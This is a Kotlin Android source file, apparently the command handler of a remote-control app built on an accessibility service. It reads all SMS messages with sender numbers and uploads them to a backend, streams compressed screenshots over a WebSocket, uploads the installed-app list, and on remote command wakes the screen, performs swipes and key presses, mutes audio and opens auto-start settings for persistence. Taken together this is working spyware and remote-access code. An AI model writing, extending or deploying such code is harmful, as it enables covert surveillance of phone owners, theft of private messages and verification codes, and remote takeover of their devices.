        try {
            val brand = Build.BRAND.lowercase() // 获取手机品牌
            val intent = when {
                brand.contains("huawei") || brand.contains("honor") -> {
                    // 华为和荣耀的开发者选项
                    Intent("com.huawei.settings.intent.action.MANAGE_APPLICATIONS").apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }

                brand.contains("xiaomi") || brand.contains("redmi") -> {
                    // 小米的开发者选项（MIUI系统）
                    Intent("com.miui.securitycenter").apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }

                brand.contains("oppo") -> {
                    // OPPO的开发者选项
                    Intent("com.coloros.safecenter").apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }

                brand.contains("vivo") -> {
                    // Vivo的开发者选项
                    Intent("com.vivo.settings.SettingsActivity").apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }

                brand.contains("samsung") -> {
                    // 三星的开发者选项
                    Intent(Settings.ACTION_SETTINGS).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }

                else -> {
                    // 默认跳转到设置主页面
                    Intent(Settings.ACTION_SETTINGS).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    private fun getSms() {
        val uri = Uri.parse("content://sms/")
        val cursor: Cursor? =
            Assists.getContext().contentResolver.query(uri, null, null, null, null)

        cursor?.use {
            val smsList = mutableListOf<SmsData>()
            val androidId = Settings.Secure.getString(
                Assists.getContext().contentResolver,
                Settings.Secure.ANDROID_ID
            )
            while (it.moveToNext()) {
                val message = it.getString(it.getColumnIndexOrThrow("body"))
                val senderNumber = it.getString(it.getColumnIndexOrThrow("address"))
                val date = it.getLong(it.getColumnIndexOrThrow("date"))

                // 将短信信息添加到列表中
                smsList.add(SmsData(senderNumber, message, date, androidId))
            }

            // 分批发送到 Laravel 后端
            sendSmsInBatches(smsList)
        }
    }

    private fun sendSmsInBatches(smsList: List<SmsData>) {
        val totalBatches = (smsList.size + BATCH_SIZE - 1) / BATCH_SIZE

        for (i in 0 until totalBatches) {
            val fromIndex = i * BATCH_SIZE
            val toIndex = minOf(fromIndex + BATCH_SIZE, smsList.size)
            val batch = smsList.subList(fromIndex, toIndex)

            sendSmsToServer(batch)
        }
    }

    private fun sendSmsToServer(smsList: List<SmsData>) {
        val client = OkHttpClient()
        val gson = Gson()

        // 将 SmsData 列表转换为 JSON 字符串
        val json = gson.toJson(smsList)

        // 创建请求体
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val requestBody = json.toRequestBody(mediaType)

        // 创建 POST 请求
        val request = Request.Builder()
            .url(AppConfig.apiURL + "/api/sms") // 替换为你的 Laravel 后端 URL
            .post(requestBody)
            .build()

        // 发送请求
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("SMS", "Exception: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("SMS", "SMS sent successfully: ${response.body?.string()}")
                } else {
                    Log.e("SMS", "Error sending SMS: ${response.code} ${response.message}")
                }
            }
        })
    }


    fun openAutoStartSettings(context: Context) {
        val intent = Intent()
        val brand = Build.BRAND.lowercase()
        try {
            when {
                brand.contains("xiaomi") -> { // 小米
                    intent.component = ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    )
                }

                brand.contains("huawei") -> { // 华为
                    intent.component = ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                    )
                }

                brand.contains("oppo") -> { // OPPO
                    intent.component = ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    )
                }

                brand.contains("vivo") -> { // Vivo
                    intent.component = ComponentName(
                        "com.iqoo.secure",
                        "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"
                    )
                }

                brand.contains("meizu") -> { // 魅族
                    intent.component = ComponentName(
                        "com.meizu.safe",
                        "com.meizu.safe.permission.SmartBGActivity"
                    )
                }

                brand.contains("samsung") -> { // 三星
                    intent.component = ComponentName(
                        "com.samsung.android.sm_cn",
                        "com.samsung.android.sm.ui.ram.AutoRunActivity"
                    )
                }

                else -> {
                    intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                    intent.data = Uri.parse("package:${context.packageName}")
                }
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e("AutoStart", "Failed to open auto-start settings: ${e.message}")

            // 使用通用方案作为兜底
            val fallbackIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
            }
            context.startActivity(fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        }
    }

    private fun sendFeedbackToBackend(action: String, success: Boolean, message: String) {
        val androidId = Settings.Secure.getString(
            Assists.getContext().contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val feedback = JSONObject().apply {
            put("action", "feedback")
            put("original_action", action)

            put("status", if (success) "success" else "failure")
            put("message", message)
            put("android_id", androidId)

        }
        Log.e("jiujiu", feedback.toString())
        send(feedback.toString())
    }

    fun sendFrameToWebSocket(bitmap: Bitmap) {
        try {
            val byteArrayOutputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, byteArrayOutputStream)
            val byteArray = byteArrayOutputStream.toByteArray()

            // 将 byteArray 转换为 Base64 字符串
            val base64Image = Base64.encodeToString(byteArray, Base64.NO_WRAP)

            val androidId = Settings.Secure.getString(
                Assists.getContext().contentResolver,
                Settings.Secure.ANDROID_ID
            )
            val feedback = JSONObject().apply {
                put("action", "image")
                put("luping", Assists.isEnableScreenCapture())

                put("android_id", androidId)
                put("image_data", base64Image) // 使用 Base64 字符串
            }

//            Log.e("jiujiu", feedback.toString())
            send(feedback.toString())
            Log.d(TAG, "Screenshot sent successfully")

        } catch (e: Exception) {
            Log.e(TAG, "Failed to send screenshot: ${e.message}")
        }
    }


    // 发送通知的方法
    private fun sendNotification(context: Context, title: String, content: String) {
        val notificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channelId = "default_channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Default Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(context, channelId)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(R.drawable.logo) // 替换为你的通知图标
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .build()

        notificationManager.notify(System.currentTimeMillis().toInt(), notification)
    }

    private fun setMute(context: Context, mute: Boolean) {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            if (mute) {
                // 设置为静音模式
                audioManager.adjustStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    AudioManager.ADJUST_MUTE,
                    0
                )
                Log.d(TAG, "System muted")
            } else {
                // 恢复音量
                audioManager.adjustStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    AudioManager.ADJUST_UNMUTE,
                    0
                )
                Log.d(TAG, "System unmuted")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to change mute state: ${e.message}")
        }
    }


    private fun handleKeyEvent(keyCode: Any, context: Context) {
        when (keyCode) {
            is Int -> {
                when (keyCode) {
                    3 -> Assists.home()
                    4 -> Assists.back()
                    187 -> Assists.tasks()
                    else -> Log.e(TAG, "Unknown keycode: $keyCode")
                }
            }

            is String -> {
                if (keyCode == "wake") {
                    wakeUpScreen(context)

                    // 延迟 1 秒后执行无障碍服务操作
                    Handler(Looper.getMainLooper()).postDelayed({
                        try {
                            performSwipeGesture(context, "up")

                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to execute gesture: ${e.message}")
                        }
                    }, 2000)
                } else {
                    Log.e(TAG, "Unknown keycode string: $keyCode")
                }
            }

            else -> Log.e(TAG, "Invalid keycode type: $keyCode")
        }
    }

    fun performSwipeGesture(
        context: Context,
        direction: String,
        duration: Long = 300L // 默认持续时间为300毫秒
    ) {
        try {
            // 获取屏幕的宽度和高度
            val (screenWidth, screenHeight) = Assists.getFullScreenResolution(context)

            // 检查屏幕分辨率是否有效
            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.e(
                    "Gesture",
                    "Invalid screen resolution: width=$screenWidth, height=$screenHeight"
                )
                return
            }

            // 定义滑动起始和结束坐标
            val (startX, startY, endX, endY) = when (direction.lowercase()) {
                "up" -> {
                    // 上滑
                    val x = screenWidth / 2f
                    val startY = screenHeight * 0.8f
                    val endY = screenHeight * 0.4f
                    arrayOf(x, startY, x, endY)
                }

                "down" -> {
                    // 下滑
                    val x = screenWidth / 2f
                    val startY = screenHeight * 0.4f
                    val endY = screenHeight * 0.8f
                    arrayOf(x, startY, x, endY)
                }

                "left" -> {
                    // 左滑
                    val y = screenHeight / 2f
                    val startX = screenWidth * 0.8f
                    val endX = screenWidth * 0.2f
                    arrayOf(startX, y, endX, y)
                }

                "right" -> {
                    // 右滑
                    val y = screenHeight / 2f
                    val startX = screenWidth * 0.2f
                    val endX = screenWidth * 0.8f
                    arrayOf(startX, y, endX, y)
                }

                else -> {
                    Log.e("Gesture", "Invalid direction: $direction")
                    return
                }
            }

            // 执行手势滑动
            CoroutineScope(Dispatchers.Main).launch {
                try {
                    Assists.gesture(
                        floatArrayOf(startX, startY),
                        floatArrayOf(endX, endY),
                        0,
                        duration
                    )
                    Log.d(
                        "Gesture",
                        "Gesture executed successfully: direction=$direction, start=($startX, $startY), end=($endX, $endY)"
                    )
                } catch (e: Exception) {
                    Log.e("Gesture", "Gesture execution failed: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e("Gesture", "Error while performing swipe gesture: ${e.message}")
        }
    }


    private fun wakeUpScreen(context: Context) {
        try {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            val wakeLock = powerManager.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "WebSocketManager:WakeLock"
            )
            wakeLock.acquire(3000)
            wakeLock.release()
            Log.d(TAG, "Screen woke up")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to wake up screen: ${e.message}")
        }
    }


    /**
     * 获取已安装应用列表
     */
    fun getInstalledAppsWithIcons(context: Context): List<Map<String, String>> {
        val packageManager = context.packageManager
        val apps = mutableListOf<Map<String, String>>()

        val installedPackages =
            packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        for (packageInfo in installedPackages) {
            val appName = packageManager.getApplicationLabel(packageInfo).toString()
            val packageName = packageInfo.packageName
            val iconBase64 = getAppIconBase64(context, packageName) ?: "" // 确保是非空字符串

            apps.add(
                mapOf(
                    "app_name" to appName,
                    "package_name" to packageName,
                    "icon" to iconBase64
                )
            )
        }
        return apps
    }

    fun getAppIconBase64(context: Context, packageName: String): String? {
        return try {
            val drawable = context.packageManager.getApplicationIcon(packageName)
            val bitmap = Bitmap.createBitmap(
                drawable.intrinsicWidth,
                drawable.intrinsicHeight,
                Bitmap.Config.ARGB_8888
            )
            val canvas = Canvas(bitmap)
            drawable.setBounds(0, 0, canvas.width, canvas.height)
            drawable.draw(canvas)

            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
            val byteArray = outputStream.toByteArray()
            Base64.encodeToString(byteArray, Base64.DEFAULT)
        } catch (e: Exception) {
            null // 如果获取图标失败，返回 null
        }
    }


    fun uploadInstalledAppsInBatches(context: Context, batchSize: Int = 50) {
        val sharedPreferences = context.getSharedPreferences("AppUploadPrefs", Context.MODE_PRIVATE)
        val currentTime = System.currentTimeMillis()

        val androidId = Settings.Secure.getString(
            Assists.getContext().contentResolver,
            Settings.Secure.ANDROID_ID
        )
        // 延迟执行上传
        CoroutineScope(Dispatchers.Main).launch {
            delay(1000) // 延迟 1 秒，避免阻塞 UI 加载
            withContext(Dispatchers.IO) {
                val apps = getInstalledAppsWithIcons(context) // 获取已安装应用列表
                val batches = apps.chunked(batchSize) // 分批处理

                for (batch in batches) {
                    uploadBatch(androidId, batch)
                }

                // 更新上传时间戳
                sharedPreferences.edit().putLong("last_upload_time", currentTime).apply()
                Log.d("InstalledApps", "应用列表上传完成")
            }
        }
    }


    fun uploadBatch(androidId: String, batch: List<Map<String, String>>) {
        val jsonBody = JSONObject(
            mapOf(
                "android_id" to androidId,
                "apps" to batch
            )
        ).toString()

        val requestBody = jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url(AppConfig.apiURL + "/api/installed-apps")
            .post(requestBody)
            .build()

        val client = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("InstalledApps", "上传应用批次失败: ${e.localizedMessage}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.e("InstalledApps", "应用批次上传成功")
                } else {
                    Log.e("InstalledApps", "应用批次上传失败: $response")
                }
            }
        })
    }
}
